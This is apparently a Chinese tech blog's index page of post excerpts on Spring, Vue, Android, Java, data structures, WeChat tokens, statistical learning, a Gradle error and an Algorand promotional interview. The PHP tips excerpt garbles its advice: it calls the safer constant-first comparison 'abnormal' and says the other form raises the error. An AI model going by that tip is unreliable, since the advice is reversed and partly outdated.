			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		流程图 流程图是表示算法思路的一种方法，流程图以特定的图形符号加上说明，表示算法的图。
一、流程图的组成 流程图一般由圆角矩形、矩形、菱形、平行四边形、箭头组成。 二、流程图图形的作用 流程图一般是由圆角矩形来表示开始与结束，用矩形表示行动方案，普通工作环节使用，菱形表示问题判断或判定环节，平行四边形表示输入输出，箭头表示工作流方向。
三、流程图基本结构 1.顺序结构：只要按照解决问题的顺序写出相应的语句就行，它的执行顺序是自上而下，依次执行。 2.条件结构：条件结构是数学中学习的算法中的一种基本逻辑结构。在一个算法中，经常会遇到一些条件的判断，算法的流程根据条件是否成立有不同的流向，条件结构就是处理这种过程的结构。条件结构也称为“选择结构”或“分支结构”，它要先根据指定的条件进行判断，再由判断的结果决定选取执行两条分支路径中的某一条。条件结构的特点是：算法中需要进行判断，判断的结果决定后面的步骤。 3.循环结构：循环结构是指在程序中需要反复执行某个功能而设置的一种程序结构。它由循环体中的条件，判断继续执行某个功能还是退出循环。根据判断条件,循环结构又可细分为以下两种形式:先判断后执行的循环结构和先执行后判断的循环结构。 4.分支结构：分支结构的执行是依据一定的条件选择执行路径，而不是严格按照语句出现的物理顺序。分支结构的程序设计方法的关键在于构造合适的分支条件和分析程序流程，根据不同的程序流程选择适当的分支语句。分支结构适合于带有逻辑或关系比较等条件判断的计算，设计这类程序时往往都要先绘制其程序流程图，然后根据程序流程写出源程序，这样做把程序设计分析与语言分开，使得问题简单化，易于理解。
四、流程图类型 1.文件流程图：在企业组织中的传递程序和管理制度的流转图。 2.数据流程图：数据流程图表示求解某一问题的数据通路，同时规定了处理的主要阶段和所用的各种数据媒体。 3.系统流程图：系统流程图表示系统的操作控制和数据流。 4.程序流程图：程序流程图表示程序中的操作顺序。 5.系统资源图：系统资源图表示适合于一个问题或一组问题求解的数据单元和处理单元的配置。 6.程序网络图：程序网络图表示程序激活路径和程序与相关数据的相互作用.在系统流程图中，一个程序可能在多个控制流中出现，但在程序网络图中，每个程序仅出现一次。
五、流程图符号意义 a. 指明数据存在的数据符号； b. 指明对数据执行的操作的处理符号； c. 表明各处理的激活和处理与数据间流向的流线符号； d. 便于读写流程图的特殊符号。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/814a533c68c80ab9f262604d21f6e807/" rel="bookmark">
			第02讲 Spring IoC对象管理与依赖注入DI
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		【】Spring IoC容器管理对象配置方式
XML方式，不用扫描句Java注解方式，要扫描句（尽可能用注解） 【2.1】XML方式配置Spring IoC容器管理的对象
配置管理的对象： &lt;bean id="employeeDao" class="com.neusoft.oa.hr.dao.impl.EmployeeDaoImpl"/&gt;
【2.2】Java扫描注解方式配置管理的对象（先去掉xml管理的对象）
分别在daoimpl, serviceimpl加@XX注解类, ②在toListbyAllController的init加下图，③在Spring配置文件context.xml中加入扫描：
&lt;context:component-scan base-package="com.neusoft.oa"/&gt;
然后运行测试。
）
Spring提供了多个注解类完成创建对象的配置。
@Component：通用的Bean的注解类。
@Repository：用于放置在DAO对象上（daoimpl）。
@Service：用于业务层对象的注册(employeeserviceimpl)。
@Controller：用于控制器类的注册。
将注解类放置在类的定义：
@Service(value="employeeService")
public class EmployeeServiceImpl implements IEmployeeService {
}
@Repository(value="employeeDao")
public class EmployeeDaoImpl implements IEmployeeDao {
}
使用注解方式管理Bean对象，需要配置扫描的起始包。
【】Spring管理依赖注入方式
属性set注入。 提供符合JavaBean模式的set方法。
private IEmployeeDao employeeDao=null; //Field
//properties 属性注入模式
@Autowired
public void setEmployeeDao(IEmployeeDao employeeDao) {
this.employeeDao = employeeDao;
}
构造方法注入： 提供一个构造方法，将依赖的对象作为参数，注入到类中。
//构造方法注入
public EmployeeServiceImpl(IEmployeeDao employeeDao) {
this.employeeDao = employeeDao;
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/814a533c68c80ab9f262604d21f6e807/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e4de4faac98a43be36629bb62abc3e6b/" rel="bookmark">
			ionic3 /2   title标题居中  图标风格统一
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		如图设置以后就可以解决安卓和ios 图标风格统一 标题居中问题了
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2b3c133087c04ef76ce4e0e7c333659d/" rel="bookmark">
			Vue 组件中监听路由变化
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 版权声明：本文首发 http://asing1elife.com ，转载请注明出处。 https://blog.csdn.net/asing1elife/article/details/82620124 Vue 组件中监听路由变化 在 Vue 的组件中可以通过 watch 监听到当前路由的变化 更多精彩 更多技术博客，请移步 asing1elife’s blog 实现方式 在 watch 按照如下规则书写即可该监听会在路由发生变化时触发 watch: { '$route' (val, old) { // 当前路由 console.log(val) // 上一个路由 console.log(old) } } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/98cee4a3ea57c244a45c5bc5aecd765a/" rel="bookmark">
			数据结构作业——1单向链表的基本操作
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		数据结构，严蔚敏C语言版。书上的基本实现。
1.h：//预定义头文件 和 宏定义（函数结果状态代码）。
#pragma once #include&lt;iostream&gt; #include&lt;malloc.h&gt; #define TRUE 1 #define FALSE 0 #define OK 1 #define ERROR 0 #define INFEASIBLE -1 #define OVER -2 #define n 10 typedef int Santus; 2.h：定义单向链表的结构体。
采用递归定义，next指向下一个结构体。
#pragma once typedef int Elemtype; typedef struct Lnode { Elemtype data; struct Lnode *next; }Lnode,*Linklist; 3.h：
#pragma once #include"1.h" #include"2.h" using namespace std; void show() { cout &lt;&lt; "1.取出第i个元素" &lt;&lt; endl &lt;&lt; "2.插入节点" &lt;&lt; endl// &lt;&lt; "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/98cee4a3ea57c244a45c5bc5aecd765a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/81c4d7bb872e9facbe332543fb2ef4a3/" rel="bookmark">
			别人遇到的两条前端面试题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		9.写出一个数组展开函数， 如输入： [1,[2,[3,4,2],2],5,[6]]， 输出数组： [1,2,3,4,2,2,5,6]
function traversal(arr, result){ for (var i=0;i&lt;arr.length;i++) { if (isArr(arr[i])) { traversal(arr[i], result) } else { result.push(arr[i]) } } } function isArr (arr) { if (Object.prototype.toString.call(arr) === '[object Array]') return true return false } function arrfn (list) { if (!isArr(list)) return var result = [] traversal(list, result) return result } console.log(arrfn([1,[2,[3,4,2],2],5,[6]])) // [1, 2, 3, 4, 2, 2, 5, 6] 10. 请实现一个querystring的序列化函数，stringify() 例如： stringify({a:1, b:2})
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/81c4d7bb872e9facbe332543fb2ef4a3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5f342fd5c0b05337853bbf64f0902f7d/" rel="bookmark">
			[异常记录]Error:Could not resolve all dependencies for configuration &#39;:app:debugRuntimeClasspath&#39;.
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		新导入的项目开始时候遇到了这个错误 Error:Could not resolve all dependencies for configuration ':app:debugRuntimeClasspath'. Could not determine artifacts for com.facebook.fresco:imagepipeline:0.9.0 Could not get resource 'https://jcenter.bintray.com/com/facebook/fresco/imagepipeline/0.9.0/imagepipeline-0.9.0.aar'. Could not HEAD 'https://jcenter.bintray.com/com/facebook/fresco/imagepipeline/0.9.0/imagepipeline-0.9.0.aar'. Connect to d29vzk4ow07wi7.cloudfront.net:443 [d29vzk4ow07wi7.cloudfront.net/127.0.0.1] failed: Connection refused: connect Connection refused: connect 各种百度搜索 也没有解决，最后在项目的build.gradle 的buildscript 和 allprojects同时加上了 mavenCentral() google() 就编译成功，特此记录下！如果对于大家有帮助就更好了！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5a0e1f8dab1dc6588ffc4c722e95826f/" rel="bookmark">
			64岁图灵奖得主攻克区块链&#34;不可能三角&#34;史上大难题！重磅分享9月12日上海见
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		区块链自诞生以来，其最大的发展阻碍便是“不可能三角”，也称“三元悖论”，即：无法同时达到“高效低能”、“去中心化”、以及“安全”这三个要求，其中必有取舍。
麻省理工学院电子工程与计算机科学系教授Silvio Micali，则创造性地引入一种“随机抽签”技术，用密码学和分布式计算的处理方式来解决这个难题，让系统拥有轻松处理上百万节点的能力，还不耗费过多能源，且安全，民主，不会分叉。
Silvio Micali曾在2012年，因在密码学和复杂度理论领域做出突出贡献，获得有着“计算机界的诺贝尔奖”之称的图灵奖。
2013年，Silvio Micali第一次接触比特币后，便被深深吸引，但也因比特币高耗能、不够民主，容易分叉，可拓展性差等问题，开始了这场从底层解决技术问题的新征程。
2018年，Silvio Micali及其团队正式推出Algorand协议。其因突破“不可能三角”而备受技术人士的关注。
2018年9月12日，CSDN&amp;区块链大本营特别邀请到Silvio Micali及Algorand首席科学家陈婧来上海，就创新性的技术方案，做一场深度交流，希望可以为中国的开发者们带来一场技术思想交锋的盛宴（详见文末）。
作者 | 鸽子
就在9月12日，也就是三天后，这位64岁的图灵奖得主Silvio Micali教授，将在上海跟中国的开发者们，来一场面对面的交流和对话。
截止9月9日上午10点，Micali教授的这场上海见面会，累计报名人数已经大大超过原计划，而新的人数仍在快速攀升。
这将是一场开发者们间的交流盛宴，一场了解当下最前沿技术的头脑风暴（具体信息，请直接翻看文末），没有之一。这里，让我们走近Silvio Micali教授，深度走进他提出的具有标志性意义的区块链协议Algorand，看看这个全新的思考维度之下，区块链将如何解决极具挑战的“不可能三角”。
图灵奖得主Micali教授的开挂人生
1954年，Silvio Micali出生于意大利西西里岛。
1978年，作为当时知名教授Corrado Böhm最得意的弟子，Micali从罗马大学毕业。
1982年，Micali获加州大学伯克利分校计算机科学博士。
1983年起，Micali开始在MIT任教，研究领域包括密码学、零知识（zero knowledge）、伪随机数生成、安全协议（secure protocol）和机制设计。
1993年，Micali获哥德尔奖（由欧洲理论计算机学会EATCS与美国计算机学会基础理论专业组织ACM SIGACT于1993年共同设立，颁发给理论计算机领域最杰出的学术论文）。
2004年，Micali获密码学领域的RSA奖。
2012年，Micali获有“计算机界诺贝尔奖”之称的图灵奖。
2013年，Micali第一次了解比特币协议，也看到了比特币协议的巨大不足，从此，他开始了新的征程——用一种全新的思路来解决区块链面临的种种技术难题，突破被当下大多数人默认的“不可能三角”（注：指在区块链技术中，无法同时达到“高效低能”、“去中心化”、以及“安全”这三个要求）。
Algoran的诞生与“不可能三角”的突破
2013年，Micali教授第一次接触到比特币。比特币背后全新的技术设计，让他兴奋不已。不过随即，他发出感叹：“这确实是个伟大的问题，但解决方案却并不够优美。”
受此激发，Micali教授决定以自己的方式，从头设计。
短短几个月，他便设计出一套全新的底层框架，也就是后来的Algorand框架。
Algorand一旦成功，将意味着系统能轻松支持上百万节点并在几秒钟内确认交易，这也将成为区块链技术长期探索中的一个标志性进展。
在接受区块链大本营（ID：blockchain_camp）的采访中，Micali教授用深入浅出的语言，为我们解释了Algorand到底如何解决大家眼中的“不可能三角”问题。
“Algorand区块链的最大亮点是同时达到了安全、高可扩展和去中心化。这表明，所谓“区块链三元悖论”——即三者最多可得其二——的说法，其实是不确切的。作为基础公链，只有做到三者兼得，才能为终端用户和高层应用提供极大的拓展空间。” Micali解释到。
从技术的角度来说，隐秘自选（也即后文提到的“加密抽签”）技术，是Algorand的创新之一。
这好比一种特殊的抽奖方式，既可以保证中奖用户的安全，也很容易验证“彩票”的真伪，还能保证抽奖的公平性。
这一技术使所有用户都能既安全又公平的参与到Algorand区块链的共识机制当中。同时这种抽奖方式还是“一次性的”，用户参与共识协议每一步时都会重新“抽奖”，确保每一步的安全性——所以在这个抽奖系统中，攻击这一步来“兑奖”的用户，对下一步哪些用户“中奖”是没有影响的。
相比于比特币的原理中，矿工需要通过竞争来获得下一个区块，并赢得区块奖励的方式，Algorand创造性地用隐秘自选技术来选择参与者创建和验证区块，这样，就极大避免了能源消耗。
此外，高效安全的共识协议是Algorand的另一创新。
如何让众多参与者对下一个区块的内容达成共识，这是区块链和分布式账本要解决的最基本问题，也是分布式计算机系统的一个关键问题。
Algorand的共识协议在协议安全角度和抗网络攻击的角度都已经达到了最优，而对于每个参与者计算量的要求非常低——例如只需要一台普通的笔记本电脑即可。这使得Algorand不必区分普通用户和“矿工”。任何一个用户都可以既享受在Algorand区块链上交易的速度和安全性，也可以同时参与Algorand的共识机制并从中获得奖励。
也就是说，原本比特币中存在的用户分级，在Algorand变得不存在了，所有人都将拥有相同的系统参与权限。
关于Algorand的其他创新技术，Micali故意卖了个小关子，他对区块链大本营（ID：blockchain_camp）表示，“我们已经给区块链的共识协议和激励机制带来了巨大的创新。在智能合约和区块链的其它方方面面，我们都将带来同样的创新。关于我们路线图的更多内容，还是留到见面会吧！提前就不透露太多技术细节了。”
对于Algorand背后的技术实现，以及Micali将亲自分享的技术细节，不少资深业内人士表现出极大的好奇和期待。
“加密抽签算法是我比较好奇的，我知道，数据库领域有类似的算法，但我想问的是，在无法确认有多少个节点在线的情况下，怎么实现加密抽签？就好比我有10支签，其中一个是有记号的，发给10给人，必然有一个人会中；但当我做好10支签之后，突然剩下3个人，那很可能就抽不中了。因为在数据库场景中，节点都是稳定的，但区块链节点有时候上线，有时候下线，这是难以预测的。那么，对于这个问题，怎么解决呢？”安全技术专家Kurt对区块链大本营（ID：blockchain_camp）说到。
信息论方向博士maxdeath对于Algorand技术，在知乎上也提出疑问，“为什么不直接选区块链生成者，而是选一些节点，然后再做一次BFT，是否一定有这样的必要性呢？”
对于这些问题，三天后的上海，让我们一一揭晓。
“如果你认为你是对的，就应该坚持下去”
自2013年被比特币深深吸引后，如今已是Micali教授全面投身区块链技术研究的第五个年头。Algorand未来将如何发展呢？
对此，他对区块链大本营（ID：blockchain_camp）说到，“一个真正分布式的、安全的、高效的区块链平台才能代表未来，在这样一个平台上，所有用户，无论大小，都可以进行复杂的交易，无论是金融方面还是其它领域。而过去这些复杂的交易类型只能由少数人来完成。”
同时，Micali透露到，分布式金融只是Algorand的目标之一，但却是一个关键目标。
2018年2月，据海内外各大媒体消息，Algorand区块链协议已完成400万美金募资。
Algorand未来是否会颠覆并取代现有的比特币，以太坊或EOS呢？
对此，Micali表示，“要实现区块链的真正潜力，我们还得期待技术上出现一次真正的进步。整个区块链将是一个巨大的生态，而在这个生态中，Algorand以其技术上的创新，一定有属于它的位置。我认为，目前有少数几种技术已经抓住了人们的想象力，它们会继续存在下去，并为用户提供有用的功能，比如某种程度上的‘储值’。”
今年，Micali已64岁，在大多数人看来，这原本已是放下一切，享受人生的时光，他却仍然每天奋战在研究的第一线，并乐此不疲。
Micali笑称自己是个工作狂，“我每天的日程都是不可预测的。这就是我的风格，整个事业生涯都是这样，效果还不错。在Algorand，我周围都是非常有创造力的人，我们在工作中会设立目标，但这个目标具体会通过什么样的路径来实现，这是不确定的。这样的探索过程，让我非常享受。”
对于工作，Micali从来的风格都是全力以赴。
“我工作的动力来自我对过去的敬重、对未来的渴望、以及乐于在当下冒险以赢得未来的想法。”Micali也对区块链大本营（ID：blockchain_camp）透露他之前一个小例子。
当Micali还在Berkeley读研究生时，开始的时候，奖学金只有一年，要继续拿奖学金就必须所有课程都拿A。但在其中一门课上，他听说了一个在当时算法领域很重要的未解决的问题，便决定全力去解决它。那个问题很难，但他痴迷于此，结果荒废了所有的课程。最后几乎所有课都只拿到了B。
“不过我成功的解决了那个问题，拿到了另一个奖学金，并且完成了我的博士学位。”Micali笑到，这是他全力以赴的方式。
由于在密码学和复杂度理论领域做出突出贡献，Micali获得2012年图灵奖。
图灵奖是计算机科学领域的最负盛名的奖项，有着“计算机界诺贝尔奖”之称，由于获奖条件苛刻，评奖程序极其严格，每年全球只有1-2名科学家获此荣誉。自1966年由美国计算机协会设立以来，至今全球仅67人获此荣誉，其中，获此殊荣的华人，仅姚期智1人。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5a0e1f8dab1dc6588ffc4c722e95826f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ab0ec2dc041de77442225a92c1077d46/" rel="bookmark">
			线程池、Lambda表达式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		day07【线程池、Lambda表达式】 主要内容 等待与唤醒案例
线程池
Lambda表达式
教学目标 -[ ] 能够理解线程通信概念-[ ] 能够理解等待唤醒机制-[ ] 能够描述Java中线程池运行原理-[ ] 能够理解函数式编程相对于面向对象的优点-[ ] 能够掌握Lambda表达式的标准格式-[ ] 能够使用Lambda标准格式使用Runnable与Comparator接口-[ ] 能够掌握Lambda表达式的省略格式与规则-[ ] 能够使用Lambda省略格式使用Runnable与Comparator接口-[ ] 能够通过Lambda的标准格式使用自定义的接口（有且仅有一个抽象方法）-[ ] 能够通过Lambda的省略格式使用自定义的接口（有且仅有一个抽象方法）-[ ] 能够明确Lambda的两项使用前提
第一章 等待唤醒机制 1.1 线程间通信 概念：多个线程在处理同一个资源，但是处理的动作（线程的任务）却不相同。
比如：线程A用来生成包子的，线程B用来吃包子的，包子可以理解为同一资源，线程A与线程B处理的动作，一个是生产，一个是消费，那么线程A与线程B之间就存在线程通信问题。
为什么要处理线程间通信：
多个线程并发执行时, 在默认情况下CPU是随机切换线程的，当我们需要多个线程来共同完成一件任务，并且我们希望他们有规律的执行, 那么多线程之间需要一些协调通信，以此来帮我们达到多线程共同操作一份数据。
如何保证线程间通信有效利用资源：
多个线程在处理同一个资源，并且任务不同时，需要线程通信来帮助解决线程之间对同一个变量的使用或操作。 就是多个线程在操作同一份数据时， 避免对同一共享变量的争夺。也就是我们需要通过一定的手段使各个线程能有效的利用资源。而这种手段即—— 等待唤醒机制。
1.2 等待唤醒机制 什么是等待唤醒机制
这是多个线程间的一种协作机制。谈到线程我们经常想到的是线程间的竞争（race），比如去争夺锁，但这并不是故事的全部，线程间也会有协作机制。就好比在公司里你和你的同事们，你们可能存在在晋升时的竞争，但更多时候你们更多是一起合作以完成某些任务。
就是在一个线程进行了规定操作后，就进入等待状态（wait()）， 等待其他线程执行完他们的指定代码过后 再将其唤醒（notify()）;在有多个线程进行等待时， 如果需要，可以使用 notifyAll()来唤醒所有的等待线程。
wait/notify 就是线程间的一种协作机制。
等待唤醒中的方法
等待唤醒机制就是用于解决线程间通信的问题的，使用到的3个方法的含义如下：
wait：线程不再活动，不再参与调度，进入 wait set 中，因此不会浪费 CPU 资源，也不会去竞争锁了，这时的线程状态即是 WAITING。它还要等着别的线程执行一个特别的动作，也即是“通知（notify）”在这个对象上等待的线程从wait set 中释放出来，重新进入到调度队列（ready queue）中
notify：则选取所通知对象的 wait set 中的一个线程释放；例如，餐馆有空位置后，等候就餐最久的顾客最先入座。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ab0ec2dc041de77442225a92c1077d46/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/906f60fe4a9f481465ef5565b2a4b6e0/" rel="bookmark">
			网易云音乐无法正常运行
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		近期网易云音乐更新了linux下的1.1版本，但是安装之后无法正常打开，不太好处理。因此我有个很好的办法那就是............果断的换到之前的1.0版本.....哈哈
下面贴上我的下载包
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e71ddd4440f342c9f550a0e5381c9589/" rel="bookmark">
			AndroidStudio自定义Toast及其用法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1.默认的Toast
2.居中的Toast
3.自定义的Toast
​
1.默认的Toast Toast.makeText(getApplicationContext(),"默认的Toast",Toast.LENGTH_LONG).show(); 格式为：Toast.makeText(所在的Activity的Context,"Toast显示的内容",Toast.LENGTH_LONG).show();
!!一定不要忘了.show哦，不然显示不出来~
2.居中的Toast //maketext决定Toast显示内容 Toast toastCenter = Toast.makeText(getApplicationContext(),"居中的Toast",Toast.LENGTH_LONG); //setGravity决定Toast显示位置 toastCenter.setGravity(Gravity.CENTER,0,0); //调用show使得toast得以显示 toastCenter.show(); 3.自定义的Toast 我自定义的Toast里面不要只有几个字，而是再加上一张图片，让Toast显得活泼一点。所以首先要写一个具有一张图片和一段文字的.xml文件，然后将其作为一个inflater塞进toast里面。
toast.xml
&lt;?xml version="1.0" encoding="utf-8"?&gt; &lt;LinearLayout xmlns:android="http://schemas.android.com/apk/res/android" android:layout_width="200dp" android:layout_height="200dp" android:orientation="vertical" android:gravity="center"&gt; ！！图片 &lt;ImageView android:id="@+id/iv_toast" android:layout_width="100dp" android:layout_height="100dp" android:layout_marginBottom="10dp" android:scaleType="fitCenter"/&gt; ！！文字 &lt;TextView android:id="@+id/tv_toast" android:layout_width="wrap_content" android:layout_height="wrap_content" android:textSize="20sp" android:textColor="@color/colorPrimaryDark" /&gt; &lt;/LinearLayout&gt; .java
Toast toast=new Toast(getApplicationContext()); //创建一个填充物,用于填充Toast LayoutInflater inflater = LayoutInflater.from(ToastActivity.this); //填充物来自的xml文件,在这个改成一个view //实现xml到view的转变哦 View view =inflater.inflate(R.layout.toast,null); //不一定需要，找到xml里面的组件，设置组件里面的具体内容 ImageView imageView1=view.findViewById(R.id.iv_toast); TextView textView1=view.findViewById(R.id.tv_toast); imageView1.setImageResource(R.drawable.smile); textView1.setText("哈哈哈哈哈"); //把填充物放进toast toast.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e71ddd4440f342c9f550a0e5381c9589/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/14cb253214cbce8fba1eb5fb5759b473/" rel="bookmark">
			java程序:求三个数的最大公约数和最小公倍数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		import java.util.ArrayList;
import java.util.List;
import java.util.Scanner;
/* *main方法用于测试结果 * */ public class GreatestCommonDivisor { public static void main(String[] args) { Scanner sc = new Scanner(System.in); int a = sc.nextInt(); int b = sc.nextInt(); int c = sc.nextInt(); int max_gcd1 = maxGcd1(a, b, c); System.out.println("最大公约数:"+max_gcd1); int max_gcd2 = maxGcd2(a, b, c); System.out.println("最大公约数:"+max_gcd2); int max_gcd3 = maxGcd3(a, b, c); System.out.println("最大公约数:"+max_gcd3); int min_gbs = mingbs1(a, b, c); System.out.println("最小公倍数:"+min_gbs); } /* * 短除法:三者共同除以一个数,除至没有余数为止 * 将所得值乘起来 * 就可以得到相应的最大公约数 * */ public static int maxGcd1(int a, int b, int c) { List&lt;Integer&gt; l = new ArrayList&lt;Integer&gt;(); int max_Gcd = 1; for (int i = 1; i &lt; Math.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/14cb253214cbce8fba1eb5fb5759b473/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/081a56709bdd1eae6aa13ac5b31aad4d/" rel="bookmark">
			Pytorch faster rcnn 三个系统版本运行情况说明
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		可能由于闲来无聊，我们将windows linux macos 三大系统的faster Rcnn 的pytorch 版本配置好了。然后做了性能比较。
由于MacOS 采用N卡的web driver 所以确实可以看到，性能很渣，实时检测来说，只能达到 8-9fps. win 下可以达到 14-15 而Ubuntu 下就可以达到17-18fps 比win 10 下略高。
可能由于ubuntu下后台运行的程序很少，都用来跑这些代码了。也验证了确实跑模型或者跑数据在Linux下比较好
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2e6c09fa43b8a8480c5f543632d1d43c/" rel="bookmark">
			微信开发中两种access_token的区别和不同用处总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		微信开发需要用到的access_token，其实是分为两个种类的，一种是普通的access_token，另一种是网页授权access_token。
普通的access_token，是微信开发者调用微信所提供的各种借口的一个凭证，有效时间为7200秒，也就是两个小时，而且一个公众号每天获取它的次数微信那边是有限制的，上限是2000次。
网页授权access_token，是第三方网页若需要使用用户的微信账户登录，需要获取它，从而来获取用户微信账户的信息。
另外，获取用户微信账户信息也有两种情况：
1. 普通的获取用户信息，只需要调用微信用户信息接口就能获取，因而使用的是第一种普通的access_token。
2. 网页授权时获取微信用户信息，用的就是第二种，网页授权access_token。
两种access_token混淆的话就会有 “invalid access_token” 的错误。
要注意的是，第一种普通的access_token是全局性的，就是说一旦重新调用接口获取一个新的普通的access_token，之前的那个旧的普通的access_token就会失效，因而用旧的普通的access_token就无法成功地调用相关的接口。所以这种特性可能会导致一些情况，比如说，多个不同的进程独立的去获取这种普通的access_token，就会导致有些接口没办法正常地调用相关的微信接口。一般的话，可以用定时器定时地更新access_token，或者将其缓存在缓存或者数据库当中，设置失效时间，在缓存当中找不到或者已经失效的情况下，再通过接口重新获取的方式来解决类似的问题。
最后，水平有限，有写得不恰当的地方望大家见谅，也可以留言提出来，我会及时更正，谢谢~
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/45f45e543936887423a2cedbcc5f38a7/" rel="bookmark">
			BaseResponse
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		package common; import com.alibaba.fastjson.JSONArray; import com.alibaba.fastjson.JSONObject; /** * Created by zipon on 2018/8/27. */ public class BaseResponse { private JSONArray headers; private int statusCode; private JSONObject responseBody; @Override public String toString() { final StringBuilder sb = new StringBuilder("{"); sb.append("\"headers\":") .append(headers); sb.append(",\"statusCode\":") .append(statusCode); sb.append(",\"responseBody\":") .append(responseBody); sb.append('}'); return sb.toString(); } public JSONArray getHeaders() { return headers; } public void setHeaders(JSONArray headers) { this.headers = headers; } public int getStatusCode() { return statusCode; } public void setStatusCode(int statusCode) { this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/45f45e543936887423a2cedbcc5f38a7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/192f9c9bdb7d07aca4e2dae1c7dbd568/" rel="bookmark">
			php小知识点
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		进行“==”判断时候可以这样写： //异常写法 if(false == $result) //正常写法 if($result == false) 第一种写法它可以很大程度上杜绝一些严重bug。
假如我们在正常方法中把 “==” 误写成 “=”，那么第二种写法反回的是未知结果，导致在运行中产生未知bug。第二种写法编辑器回跑出一个error，我们就可以及时发现并且修复问题。
2. 对于php脚本"&lt; ? php"前不要有空行，php脚本结尾的 “?&gt;” 尽量省略：
假如有一个文件在 ?&gt; 后有一个空白行，那么你在使用 session_start() 等方法时，会返回一个警告 headers already sent by xxx ，这是因为 session_start() 要求使用前不能有任何输出。
同理 &lt;?php 前的空行也会存在同样的问题。
3. 字符串和数字在一起时，要留神
var_dump('a'.0); //返回error，语法错误 解决的方案比较简单，只要在.连接左右加上空格就可以防止语法错误。
4. 看下面代码：
var_dump ('abc' == 0); //输出true var_dump ('1abc' == 0); //输出false 这个例子中输出true是不是让你大吃一惊，其实php中将字符串和数字做比较时，会把字符串强制转换为int型，转换规则为 如果字符串是数字开头，那么取开头数字作为转换结果，如果开头不是数字那么就为0
5. 字符串的运算：
for ($i = 'a'; $i &lt;= 'c'; ++$i) { echo "$i "; } 输出结果如下：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/192f9c9bdb7d07aca4e2dae1c7dbd568/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/31233a48fcef553ad141279f83ee25b9/" rel="bookmark">
			统计学习方法概述（模型、策略、算法）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		主要内容（只考虑监督学习） （1）统计学习三要素概述
（2）理解目标函数、代价函数、损失函数
（3）理解经验风险、结构风险（正则化）
-------------------------------------------------------------------------------------------------------------------------
一、统计学习方法概述 统计学习三要素：方法 = 模型+策略+算法
1、模型
在监督学习过程中，模型就是要学习条件概率分布或决策函数，模型假设空间包含所有可能的条件概率分布或决策函数（假设空间内的模型有无穷个），函数空间内通常由一个参数向量决定函数族，参数向量取值于n维欧式空间，称为参数空间。
2、策略
策略就是按照什么样的规则选择或学习最优的模型。在监督学习中，就是在假设空间中选择最优模型作为决策函数。
损失函数：度量模型一次预测的好坏
风险函数：度量平均意义下模型预测的好坏
对于给定的,由给出相应的输出Y，这个输出的预测值与真实值Y可能一致可能不一致，在此，用一个损失函数或代价函数来度量预测错误的程度，记作,常用的损失函数（代价函数）：
（1）0-1损失
（2）平方损失
（3）绝对损失函数
（4）对数损失函数或对数似然损失函数
演进过程 （a）关键词：期望风险、经验风险
学习的目标（策略）：选择期望风险最小的模型
期望风险：
经验风险：
